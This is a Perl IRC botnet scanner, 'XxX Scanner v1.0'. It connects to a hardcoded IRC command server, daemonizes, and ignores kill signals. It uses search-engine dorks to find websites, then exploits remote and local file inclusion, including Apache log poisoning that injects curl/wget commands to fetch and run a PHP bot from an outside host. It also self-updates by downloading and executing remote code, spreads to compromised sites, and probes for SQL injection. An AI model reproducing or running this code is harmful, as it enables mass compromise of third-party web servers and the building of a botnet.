#!/usr/bin/perl
#####################
# XxX Scanner v1.0  #
#####################

use HTTP::Request;
use LWP::UserAgent;
use IO::Socket;
use IO::Select;
use Socket;
use MIME::Base64;

my $whoami = "2012.pl";
my $ircserver = "208.115.247.146";
my $ircport   = "6000";
my $nickname  = "scan".int(rand(1000));
my $ident     = "scan";
my $channel   = "#scan#";
my $runner    = "XxX";
my $fullname  = "XxX";
my $ftp       = "http://darling.comze.com/";
my $injector  = "id.jpg";
my $phpshell  = "shell.jpg";
my $bot = "dark.jpg";
my $rficmd    = '!rfi';
my $lficmd    = '!lfi';
my $mysqlcmd  = '!mysql';
my $mssqlcmd  = '!mssql';
my $alicmd    = '!log';
my $ver = "1.0";

$rfi_result   = "FeeLCoMz";
my @gdomains = ("com","de","fr","co.uk","ru","it");
my @bdomains = ("com","de","fr","uk","ru","it","jp");
my @badlink = ("linux","torrent","facebook","voice\.fi","0day","security","overflow","demo\.","ioncube","jetlib","joomlart","osvdb","inj3ct0r","exploit","youtube","blogspot","emcjp","groovecreole","nwogeo","abuse","malware","indexoffiles","geradeauslaufen","access.log","htaccess","hack0wn","webmailhouse","rtlplus","schraubenundsaufen","rankarea","hydro-g","holydiscountservers","ichwill","spargelbaum","assist-tech","pyratz","mlsec","spam","glas-blog","awstats","error.log","wwwstats");
$lfi_test     = "../../../../../../../../../../../../../../../proc/self/environ%00";
$lfi_output   = "HTTP_USER_AGENT";
$sql_test     = "'";
$mysql_output = ("Query failed|Query Error|right syntax to use near");
$mssql_output = ("SQL Server error|Incorrect syntax near|syntax error converting|unclosed quotation");
@logs = (
"../../../../../../../../../../../../../../../usr/local/apache/logs/access.log",
"../../../../../../../../../../../../../../../usr/local/apache/logs/access_log",
"../../../../../../../../../../../../../../../var/log/apache2/access.log",
"../../../../../../../../../../../../../../../var/log/apache2/access.log",
"../../../../../../../../../../../../../../../var/log/apache/access.log",
"../../../../../../../../../../../../../../../var/log/apache/access.log",
"../../../../../../../../../../../../../../../var/log/httpd/access.log",
"../../../../../../../../../../../../../../../var/log/httpd/access_log",
"../../../../../../../../../../../../../../../var/www/log/access_log",
"../../../../../../../../../../../../../../../var/www/log/access.log",
"../../../../../../../../../../../../../../../var/www/logs/access.log",
"../../../../../../../../../../../../../../../var/www/logs/access_log",
"../../../../../../../../../../../../../../..\apache\logs\access.log",
"../../../../../../../../../../../../../../..\Program Files\Apache Group\Apache\logs\access.log",
"../../../../../../../../../../../../../../..\xampp\apache\logs\access.log",
);
$SIG{'INT'}   = 'IGNORE';
$SIG{'HUP'}   = 'IGNORE';
$SIG{'TERM'}  = 'IGNORE';
$SIG{'CHLD'}  = 'IGNORE';
$SIG{'PS'}    = 'IGNORE';

chdir("/tmp");
my $pid = fork;
exit if $pid;
die "\n [!] Something Wrong !!!: $!" unless defined($pid);

our %irc_servers;
our %DCC;
my $dcc_sel = new IO::Select->new();
$sel_client = IO::Select->new();

sub sendraw {
	if ($#_ == '1') {
	my $socket = $_[0];
	print $socket "$_[1]\n";
	} else {
		print $IRC_cur_socket "$_[0]\n";
	}
}

sub connector {
	my $mynick = $_[0];
	my $ircserver_con = $_[1];
	my $ircport_con = $_[2];
	my $IRC_socket = IO::Socket::INET->new(Proto=>"tcp", PeerAddr=>"$ircserver_con", PeerPort=>$ircport_con) or return(1);
	if (defined($IRC_socket)) {
		$IRC_cur_socket = $IRC_socket;
		$IRC_socket->autoflush(1);
		$sel_client->add($IRC_socket);
		$irc_servers{$IRC_cur_socket}{'host'} = "$ircserver_con";
		$irc_servers{$IRC_cur_socket}{'port'} = "$ircport_con";
		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		$irc_servers{$IRC_cur_socket}{'myip'} = $IRC_socket->sockhost;
		nick("$mynick");
		sendraw("USER $ident ".$IRC_socket->sockhost." $ircserver_con :$fullname");
		sleep 1;
	}
}

sub parse {
	my $servarg = shift;
	if ($servarg =~ /^PING \:(.*)/) {
		sendraw("PONG :$1");
	} elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?) PRIVMSG (.+?) \:(.+)/) {
		my $pn=$1; my $hostmask= $3; my $onde = $4; my $args = $5;
		if ($args =~ /^\001VERSION\001$/) {
			notice("$pn", "\001VERSION mIRC v6.17 Khaled Mardam-Bey\001");
		}
		if ($args =~ /^(\Q$mynick\E|\!a)\s+(.*)/i ) {
			my $natrix = $1;
			my $arg = $2;
		}
	}
	elsif ($servarg =~ /^\:(.+?)\!(.+?)\@(.+?)\s+NICK\s+\:(\S+)/i) {
		if (lc($1) eq lc($mynick)) {
			$mynick=$4;
			$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		}
	} elsif ($servarg =~ m/^\:(.+?)\s+433/i) {
		nick("$mynick|".int rand(999));
	} elsif ($servarg =~ m/^\:(.+?)\s+001\s+(\S+)\s/i) {
		$mynick = $2;
		$irc_servers{$IRC_cur_socket}{'nick'} = $mynick;
		$irc_servers{$IRC_cur_socket}{'nome'} = "$1";
		sendraw("MODE $nickname +Bix");
		sendraw("JOIN $channel");
		sendraw("PRIVMSG $channel :15,1XxX Scanner v$ver Launched!");
	}
}

my $line_temp;
while( 1 ) {
	while (!(keys(%irc_servers))) { connector("$nickname", "$ircserver", "$ircport"); }
	delete($irc_servers{''}) if (defined($irc_servers{''}));
	my @ready = $sel_client->can_read(0);
	next unless(@ready);
	foreach $fh (@ready) {
		$IRC_cur_socket = $fh;
		$mynick = $irc_servers{$IRC_cur_socket}{'nick'};
		$nread = sysread($fh, $msg, 4096);
		if ($nread == 0) {
			$sel_client->remove($fh);
			$fh->close;
			delete($irc_servers{$fh});
		}
		@lines = split (/\n/, $msg);
		$msg =~ s/\r\n$//;

		#####################################################################
		############################[ CMD LIST ]#############################
		#####################################################################

		if ($msg=~ /PRIVMSG $channel :$nickname !help/i){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Help15) 10 $rficmd <bug> <dork> | $lficmd <bug> <dork> ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Help15) 10 $mysqlcmd / $mssqlcmd <bug> <dork> ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Help15) 10 Apache Log Injection : $alicmd <host> <port> ");
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Help15) 10 !id | !engine | !pid | !version ");
		}

		if ($msg=~ /PRIVMSG $channel :!id\s*(.*)/i){
			my $ref = $1;
			if ($1) { &response($ref); } else { &response(); }
		}

		if ($msg=~ /PRIVMSG $channel :$nickname !restart/i) {
			exec ("kill -9 `pidof perl`; perl /tmp/2012.pl");
		}	

		if ($msg=~ /PRIVMSG $channel :$nickname !update\s+(.*)/i) {
			exec ("curl -o /tmp/2012.pl $1; wget -O /tmp/2012.pl $1; kill -9 `pidof perl`; perl /tmp/2012.pl");
		}			
		
		if ($msg=~ /PRIVMSG $channel :!version/i){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Version15)10 XxX Scanner v$ver");
		}

		if ($msg=~ /PRIVMSG $channel :!engine/i){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Engine15)10 Google, Cuil, Bing, Baidu, ASK, Yahoo.");
		}

		if ($msg=~ /PRIVMSG $channel :!pid/i){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8PID15)10 Process/ID : 4 $fakeproc - $$");
		}

		#####################################################################
		###############################[ RFI ]###############################
		#####################################################################
		##################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $rficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) { exit; } else {
					my $engx = "Google";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 Dork:15 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 File:15 $bugx");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 ID:15 ".$path.$injector);
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 Search Engine Loading ...");
					&rfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}

		##################################################################### Yahoo Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $rficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Yahoo";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&rfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}
		
		##################################################################### Bing Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $rficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Bing";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&rfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}

		##################################################################### ASK Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $rficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AsK";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&rfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}		
		
		##################################################################### Baidu Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $rficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) { exit; } else {
					my $engx = "Baidu";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&rfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}
		
		##################################################################### Cuil Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $rficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) { exit; } else {
					my $engx = "Cuil";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&rfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}

		#####################################################################
		###############################[ LFI ]###############################
		#####################################################################
		##################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $lficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Google";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)10 Dork :15 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)10 File :15 $bugx");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)10 Search Engine Loading ...");
					&lfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}

		##################################################################### Baidu Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $lficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Baidu";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&lfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}

		##################################################################### Bing Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $lficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Bing";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&lfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}

		##################################################################### ASK Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $lficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AsK";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&lfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}

		##################################################################### Yahoo Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $lficmd\s+(.*?)\s+(.*)\s+\-p(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Yahoo";
					my $bugx = $1;
					my $d0rk = $2;
					my $path = $3;
					&lfiscan($engx,$bugx,$d0rk,$path);
				}
				exit;
			}
		}

		#####################################################################
		##############################[ MySQL ]##############################
		#####################################################################

		##################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mysqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Google";
					my $bugx = $1;
					my $d0rk = $2;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)10 Dork :15 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)10 File :15 $bugx");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)10 Search Engine Loading ...");
					&mysqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Baidu Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mysqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Baidu";
					my $bugx = $1;
					my $d0rk = $2;
					&mysqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Bing Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mysqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Bing";
					my $bugx = $1;
					my $d0rk = $2;
					&mysqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ASK Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mysqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AsK";
					my $bugx = $1;
					my $d0rk = $2;
					&mysqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Yahoo Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mysqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Yahoo";
					my $bugx = $1;
					my $d0rk = $2;
					&mysqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		#####################################################################
		##############################[ MSSQL ]##############################
		#####################################################################

		##################################################################### Google Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mssqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Google";
					my $bugx = $1;
					my $d0rk = $2;
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)10 Dork :15 $d0rk");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)10 File :15 $bugx");
					sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)10 Search Engine Loading ...");
					&mssqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Baidu Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mssqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Baidu";
					my $bugx = $1;
					my $d0rk = $2;
					&mssqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Bing Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mssqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Bing";
					my $bugx = $1;
					my $d0rk = $2;
					&mssqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### ASK Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mssqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "AsK";
					my $bugx = $1;
					my $d0rk = $2;
					&mssqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		##################################################################### Yahoo Engine
		if ($msg=~ /PRIVMSG $channel :$nickname $mssqlcmd\s+(.*?)\s+(.*)/i ) {
			if (my $pid = fork) {
				waitpid($pid, 0);
			}
			else {
				if (fork) {	exit; } else {
					my $engx = "Yahoo";
					my $bugx = $1;
					my $d0rk = $2;
					&mssqlscan($engx,$bugx,$d0rk);
				}
				exit;
			}
		}

		for(my $c=0; $c<= $#lines; $c++) {
			$line = $lines[$c];
			$line=$line_temp.$line if ($line_temp);
			$line_temp='';
			$line =~ s/\r$//;
			unless ($c == $#lines) {
				parse("$line");
			} else {
				if ($#lines == 0) {
					parse("$line");
				} elsif ($lines[$c] =~ /\r$/) {
					parse("$line");
				} elsif ($line =~ /^(\S+) NOTICE AUTH :\*\*\*/) {
					parse("$line");
				} else {
					$line_temp = $line;
				}
			}
		}
	}
}

##################################################################### Procedure

sub rfiscan() {
	my $engz = $_[0];
	my $bugz = $_[1];
	my $dork = $_[2];
	my $path = $_[3];
	my $contatore = 0;
	$ban = 0;
	if ($engz =~ /Google/) {
		my @google=&google($dork);
		push(@total, @google);
	}
	if ($engz =~ /Cuil/) {
		my @cuil=&cuil($dork);
		push(@total, @cuil);
	}	
	if ($engz =~ /Baidu/) {
		my @baidu=&baidu($dork);
		push(@total, @baidu);
	}
	if ($engz =~ /Bing/) {
		my @Bing=&Bing($dork);
		push(@total, @Bing);
	}
	if ($engz =~ /AsK/) {
		my @ask=&ask($dork);
		push(@total, @ask);
	}
	if ($engz =~ /Yahoo/) {
		my @yahoo=&yahoo($dork);
		push(@total, @yahoo);
	}
	my @target = lnk_filter(@total);
	my @clean=&calculate(@target);
	if ($ban == 0) { 
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)(7@11$engz15)10 Total:4 (".scalar(@total).")10 Clean:9 (".scalar(@clean).")");
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)(7@11$engz15)4 Banned!");
	}
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)(7@11$engz15)10 Exploiting15 $dork");
	}
	my $uni=scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)(7@11$engz15)10 Scan Finish for15 $dork");
		}
		if ($_[3]) { $xpl  = "http://".$target.$bugz.$path.$injector."??"; } else { $xpl  = "http://".$target.$bugz.$ftp.$injector."??"; }
		if ($_[3]) { $vuln = "http://".$target."3".$bugz."7".$path.$phpshell."??"; } else { $vuln = "http://".$target."3".$bugz."7".$ftp.$phpshell."??"; }
		my $re   = getcontent($xpl);
		if($re =~ /$rfi_result/i && $re =~ /uid=/i){
			os($xpl);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)(7@11$engz15)15(7\@13Vulnerable15)15 ".$vuln." 15(7\@6OS: ".$os."15)(74Safe: OFF15)");
			if ($_[3]) { $myurl = $path.$bot; } else { $myurl = $ftp.$bot; }
			$xpl2  = "http://".$target.$bugz.$myurl."??";
			my $re = getcontent($xpl2);
			if($re =~ /Success/i){	
				sendraw($IRC_cur_socket, "PRIVMSG $channel :10Spreading 9OK10!");
			} else {
				sendraw($IRC_cur_socket, "PRIVMSG $channel :10Spreading 4Error10! Trying manual start...");
				sendraw($IRC_cur_socket, "PRIVMSG $channel :!own http://".$target.$bugz." -p".$myurl."??");		
				sleep(1);			
			}		
		}
		elsif($re =~ /$rfi_result/i)
		{
			os($xpl);
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)(7@11$engz15)15(7\@13Vulnerable15)4 ".$vuln." 15(7\@6OS: ".$os."15)(79Safe: ON15)");
			if ($_[3]) { $xpl2  = "http://".$target.$bugz.$path.$bot."??"; } else { $xpl2  = "http://".$target.$bugz.$ftp.$bot."??"; }
			my $re = getcontent($xpl2);
			if($re =~ /Success/i){	
				sendraw($IRC_cur_socket, "PRIVMSG $channel :10Spreading 9OK7!");
			} else {
				sendraw($IRC_cur_socket, "PRIVMSG $channel :10Spreading 4Error7! Trying manual start...");
				sendraw($IRC_cur_socket, "PRIVMSG $channel :!own http://".$target.$bugz." -p".$myurl."??");	
				sleep(1);			
			}		
		}
	}
}

sub lfiscan() {
	my $engz = $_[0];
	my $bugz = $_[1];
	my $dork = $_[2];
	my $path = $_[3];	
	my $contatore = 0;	
	if ($engz =~ /Google/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /Baidu/) {
		my @baidu=&baidu($dork);
		push(@total, @baidu);
	}
	if ($engz =~ /Bing/) {
		my @Bing=&Bing($dork);
		push(@total, @Bing);
	}
	if ($engz =~ /AsK/) {
		my @ask=&ask($dork);
		push(@total, @ask);
	}
	if ($engz =~ /Yahoo/) {
		my @yahoo=&yahoo($dork);
		push(@total, @yahoo);
	}
	my @target = lnk_filter(@total);
	my @clean=&calculate(@target);
	if ($ban == 0) { 
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)(7@11$engz15)10 Total:4 (".scalar(@total).")10 Clean:9 (".scalar(@clean).")");
	} else {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)(7@11$engz15)4 Banned!");
	}
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)(7@11$engz15)10 Exploiting4 $dork");
	}
	my $uni=scalar(@clean);

	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8LFI15)(7@11$engz15)10 Scan Finish for15 $dork");
		}
		if ($_[3]) { $comando = "curl -O /tmp/dark.jpg ".$path.$bot.";wget -o /tmp/dark.jpg ".$path.$bot.";php dark.jpg"; } else { $comando = "curl -O /tmp/dark.jpg ".$ftp.$bot.";wget -o /tmp/dark.jpg ".$ftp.$bot.";php dark.jpg"; }
		my $vuln = "http://".$target."10".$bugz."7".$lfi_test."";
		injectlog($target,$bugz,$lfi_test,$comando);
	}
}

sub mysqlscan() {
	my $engz = $_[0];
	my $bugz = $_[1];
	my $dork = $_[2];
	my $contatore = 0;
	if ($engz =~ /Google/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /Baidu/) {
		my @baidu=&baidu($dork);
		push(@total, @baidu);
	}
	if ($engz =~ /Bing/) {
		my @Bing=&Bing($dork);
		push(@total, @Bing);
	}
	if ($engz =~ /AsK/) {
		my @ask=&ask($dork);
		push(@total, @ask);
	}
	if ($engz =~ /Yahoo/) {
		my @yahoo=&yahoo($dork);
		push(@total, @yahoo);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)(7@8$engz15)10 Total:4 (".scalar(@total).")10 Clean:4 (".scalar(@clean).")");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)(7@8$engz15)7 Exploiting4 $dork");
	}
	my $uni = scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)(7@8$engz15)10 Scan Finish for15 $dork");
		}
		my $xpl  = "http://".$target.$bugz.$sql_test;
		my $vuln = "http://".$target."10".$bugz."7[SQL]";
		my $re   = getcontent($xpl);
		if ($re  =~ /$mysql_output/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)(7@8$engz15)15(13@10ErrorQuery15)4 ".$vuln." 15(7@15XxX15)");
            sleep(2);
		}
	}
}

sub mssqlscan() {
	my $engz = $_[0];
	my $bugz = $_[1];
	my $dork = $_[2];
	my $contatore = 0;
	if ($engz =~ /Google/) {
		my @google=&google($dork);
		push(@total, @google);
		}
	if ($engz =~ /Baidu/) {
		my @baidu=&baidu($dork);
		push(@total, @baidu);
	}
	if ($engz =~ /Bing/) {
		my @Bing=&Bing($dork);
		push(@total, @Bing);
	}
	if ($engz =~ /AsK/) {
		my @ask=&ask($dork);
		push(@total, @ask);
	}
	if ($engz =~ /Yahoo/) {
		my @yahoo=&yahoo($dork);
		push(@total, @yahoo);
	}
	my @clean = &calculate(@total);
	sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)(7@8$engz15)10 Total:4 (".scalar(@total).")10 Clean:4 (".scalar(@clean).")");
	if (scalar(@clean) != 0) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)(7@8$engz15)10 Exploiting15 $dork");
	}
	my $uni = scalar(@clean);
	foreach my $target (@clean)
	{
		$contatore++;
		if ($contatore==$uni-1){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)(7@8$engz15)10 Scan Finish for15 $dork");
		}
		my $xpl  = "http://".$target.$bugz.$sql_test;
		my $vuln = "http://".$target."10".$bugz."7[SQL]";
		my $re   = getcontent($xpl);
		if ($re  =~ /$mssql_output/){
			sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8SQL15)(7@8$engz15)15(13@10ErrorQuery15)4 ".$vuln." 15(7@15XxX15)");
            sleep(2);
		}
	}
}

sub os() {
	my $site = $_[0];
	my $re   = &query($site);
	while ($re =~ m/<br>os:(.+?)<br>/ig) {
		$os = $1;
		if ($1 eq "") { $os = "Unknown"; }
	}
}

sub response() {
	my $path = $_[0];
	if ($_[0]) { $re = getcontent($path.$injector); } else { $re = getcontent($ftp.$injector); }
    if ($re =~ /$rfi_result/i) {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 « 9ONLINE10 »");
    }
    else {
        sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8RFI15)10 « 4OFFLINE10 »");
    }
}

sub getcontent() {
    my $url = $_[0];
    my $req = HTTP::Request->new(GET => $url);
    my $ua  = LWP::UserAgent->new();
    $ua->timeout(5);
    my $response = $ua->request($req);
    return $response->content;
}

sub google() {
	my @lst;
	foreach my $tld ( @gdomains ) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Mass15)(7@11Google[$tld]15) Started.");
		my $pag = 0;
		my $key = $_[0];
		my $Go = "http://www.google.".$tld."/search?q=".key($key)."&num=100&filter=0&start=".$pag;
		my $Res=query($Go);
	#	if ($Res =~ //) { 
	#		$ban = 1;
	#	}	
		while ($Res =~ /display:block;margin-left:53px/) {
			while ($Res =~ m/<a href="http:\/\/(.+?)"/g) {
				if ($1 !~ /google/){		
					my $k=$1;
					my @grep=links($k);
					push(@lst,@grep);				
				}			
			}
			$pag += 100;
			$Go = "http://www.google.".$tld."/search?q=".key($key)."+ext%3Aphp&num=100&filter=0&start=".$pag;
			$Res=query($Go);	
		}
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Mass15)(7@11Google[$tld]15) Finished.");		
	}
	return @lst;
}

sub cuil() {
    my @lst;
    my $key = $_[0];
    my $Go=("http://www.cuil.com/search?q=".key($key));
	my $Res=query($Go);
	while ($Res =~ /id="a_next" href="(.*?)">/) {
		my $next = $1;
		while ($Res =~ m/<a class="url" href="http:\/\/(.*?)"/g) {
			my $k=$1;
			my @grep=links($k);
			push(@lst,@grep);
		}
		$Res=query("http://www.cuil.com/search".$next);
	}
	return @lst;
}

sub baidu() {
    my @lst;
	my $pag = 0;
    my $key = $_[0];
    my $Go = "http://www.baidu.com/s?wd=".key($key);
	my $Res=query($Go);
#	if ($Res =~ //) { 
#		$ban = 1;
#	}	
	while ($Res =~ /<\/font><\/a>&nbsp;<\/div>/) {
		while ($Res =~ m/href="http:\/\/(.+?)"/g) {
            if ($1 !~ /baidu/){		
				my $k=$1;
				my @grep=links($k);
				push(@lst,@grep);	
            }			
		}
		$pag += 10;
		$Go = "http://www.baidu.com/s?wd=".key($key)."&pn=".$pag;
		$Res=query($Go);
	}
	return @lst;	
}

sub Bing() {
	my @lst;
	foreach my $tld ( @bdomains ) {
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Mass15)(7@11Bing[$tld]15) Started");	
		my $pag = 1;
		my $key = $_[0];
		my $Go = "http://www.bing.com/search?q=".key($key)."&filt=all&first=".$pag."&cc=".$tld;
		my $Res=query($Go);
	#	if ($Res =~ //) { 
	#		$ban = 1;
	#	}	
		while ($Res =~ /class="sb_pagN"/) {
			while ($Res =~ m/<a href=\"http:\/\/(.+?)"/g) {
				if ($1 !~ /msn|live|bing|microsoft/){		
					my $k=$1;
					my @grep=links($k);
					push(@lst,@grep);					
				}			
			}
			$pag += 10;
			$Go = "http://www.bing.com/search?q=".key($key)."&filt=all&first=".$pag."&cc=".$tld;
			$Res=query($Go);	
		}
		sendraw($IRC_cur_socket, "PRIVMSG $channel :15(7@8Mass15)(7@11Bing[$tld]15) Finished");		
	}	
	return @lst;	
}

